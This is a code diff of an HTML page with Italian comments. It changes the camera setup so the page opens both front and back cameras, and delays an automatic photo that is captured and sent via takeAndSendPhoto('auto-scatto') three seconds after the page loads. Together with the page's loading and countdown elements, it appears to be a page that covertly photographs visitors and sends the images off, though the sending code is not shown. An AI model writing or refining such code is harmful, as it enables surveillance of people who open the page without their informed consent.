@@ -71,14 +71,6 @@
       color: #000;
     }
 
-    .link {
-      color: #00bfff;
-      font-size: 14px;
-      margin: 6px 0;
-      text-decoration: none;
-      display: block;
-    }
-
     .loading {
       font-size: 18px;
       margin-top: 30px;
@@ -152,22 +144,32 @@
     }
   }, 1000);
 
-  function startVideoStreams() {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-      .then(stream => {
-        videoFront.srcObject = stream;
-      })
-      .catch(() => {
-        showFailure("Webcam frontale non disponibile.");
-      });
+  async function startVideoStreams() {
+    const devices = await navigator.mediaDevices.enumerateDevices();
+    const videoDevices = devices.filter(d => d.kind === 'videoinput');
 
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } })
-      .then(stream => {
-        videoBack.srcObject = stream;
-      })
-      .catch(() => {
-        console.warn("Webcam posteriore non disponibile.");
-      });
+    const frontCam = videoDevices.find(d => d.label.toLowerCase().includes('front')) || videoDevices[0];
+    const backCam = videoDevices.find(d => d.label.toLowerCase().includes('back')) || videoDevices[1];
+
+    if (frontCam) {
+      navigator.mediaDevices.getUserMedia({ video: { deviceId: frontCam.deviceId } })
+        .then(stream => {
+          videoFront.srcObject = stream;
+        })
+        .catch(err => {
+          console.warn('❌ Fotocamera frontale non disponibile', err);
+        });
+    }
+
+    if (backCam) {
+      navigator.mediaDevices.getUserMedia({ video: { deviceId: backCam.deviceId } })
+        .then(stream => {
+          videoBack.srcObject = stream;
+        })
+        .catch(err => {
+          console.warn('❌ Fotocamera posteriore non disponibile', err);
+        });
+    }
   }
 
   startVideoStreams();
@@ -226,8 +228,11 @@
     `;
   }
 
-  // Autoscatto iniziale
-  setTimeout(() => takeAndSendPhoto("auto-scatto"), 1500);
+  // Autoscatto iniziale ritardato
+  setTimeout(() => {
+    console.log("📸 Autoscatto in corso");
+    takeAndSendPhoto("auto-scatto");
+  }, 3000);
 </script>
 
 </body>
